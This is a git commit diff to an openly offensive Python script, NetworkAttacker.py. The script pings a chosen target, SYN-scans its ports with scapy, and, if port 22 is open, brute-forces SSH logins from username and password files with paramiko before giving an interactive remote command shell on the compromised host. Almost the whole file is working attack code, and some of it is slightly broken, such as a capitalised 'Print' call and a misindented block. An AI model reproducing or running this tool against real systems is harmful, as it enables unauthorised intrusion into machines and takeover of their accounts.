e8e209ade19526c141b32b8541bed7aeecf25970
CzerwonyCapturek <79225965+CzerwonyCapturek@users.noreply.github.com>
2021-07-18 16:55:51 -0400

    Update NetworkAttacker.py

--- NetworkAttacker.py
+++ NetworkAttacker.py
@@ -1,19 +1,25 @@
 import random
 import paramiko
+import os
 from scapy.all import *
 from scapy.layers.inet import TCP, IP, sr1, ICMP
 
 
 Registered_ports=range(1,1023)
 Open_Ports=[]
+Port22 = False
+TargetFlaga = False
+
+
+
 
 def BruteForce(atak_port):
 
     authenticated=False
     cmd=""
 
-    SSHClient=paramiko.SSHClient()
-    SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    SSHconn=paramiko.SSHClient()
+    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     with open(r"users.txt", "r") as users_plik:
         users=users_plik.read().split('\n')
@@ -24,40 +30,57 @@ def BruteForce(atak_port):
         for password in passwords:
             try:
                 print("[DEBUG] username:{}, password:{}".format(user,password))
-                SSHClient.connect(hostname=target, username=user,password=password,timeout=1,port=atak_port)
+                SSHconn.connect(hostname=target, username=user,password=password,timeout=1,port=atak_port)
                 print(" -------------------------------------------------------------------")
                 print("[+] Login succed with user: {} and password: {}".format(user,password))
                 print(" -------------------------------------------------------------------")
                 while True:
                     cmd=input("Choose a command to execute in the system or exit: ")
                     if cmd == "exit":
-                        SSHClient.close()
+                        SSHconn.close()
                         exit(0)
                     else:
-                        std_in, std_out, std_err = SSHClient.exec_command(cmd)
+                        std_in, std_out, std_err = SSHconn.exec_command(cmd)
                         authenticated = True
                         print("Command Execute:\n{} \nErrors:\n{}\n".format(std_out.read().decode(),std_err.read().decode()))
             except paramiko.ssh_exception.AuthenticationException as error:
                 print(f"login:{user} and password:{password} failed")
 
+def ScanPort(atak_port):
+    global Port22
+    src_port = RandShort()
+    conf.verb = 0
+    response = sr1(IP(dst=target)/TCP(sport=src_port,dport=atak_port,flags="S"),timeout=0.5,verbose=0)
+    if(response.haslayer(TCP)):
+        if(response.getlayer(TCP).flags == 0x12):
+            close_connection = sr(IP(dst=target)/TCP(sport=src_port,dport=atak_port,flags='R'),timeout=2, verbose=0)
+            print(f" port {atak_port} is open.")
+            if atak_port==22:
+                Port22=True
+            
+
+def TargetCheck(target):
+    global TargetFlaga
+    response = ""
+    response = sr1(IP(dst = target)/ICMP(),timeout = 3)
+        if(response !=""):
+            TargetFlaga = True
+
+
 
 target = input("Please specify a target: ")
 #10.0.0.122
-Port22 = False
+#192.168.80.133
+TargetCheck(target)
 
-for destination_port in range(0, 1000):
-    src_port = random.randint(1,65534)
-    response = sr1(IP(dst=target)/TCP(sport=src_port,dport=destination_port,flags="S"),timeout=1,verbose=0)
-    if(response.haslayer(TCP)):
-        if destination_port==22:
-            Port22=True
-        if(response.getlayer(TCP).flags == 0x12):
-            close_connection = sr(IP(dst=target)/TCP(sport=src_port,dport=destination_port,flags='R'),timeout=1, verbose=0)
-            print(f" port {destination_port} is open.")
+if TargetFlaga:
+    Print("IP jest ok")
+    for destination_port in range(0, 1000):
+        ScanPort(destination_port)
 
-if Port22==True:
-    attack=input("brute-force attack on that port 22 ? (y/n): ")
-    if attack=="y":
-        BruteForce(22)
-    else:
-        exit(0)
+    if Port22==True:
+        attack=input("brute-force attack on that port 22 ? (y/n): ")
+        if attack=="y":
+            BruteForce(22)
+        else:
+            exit(0)
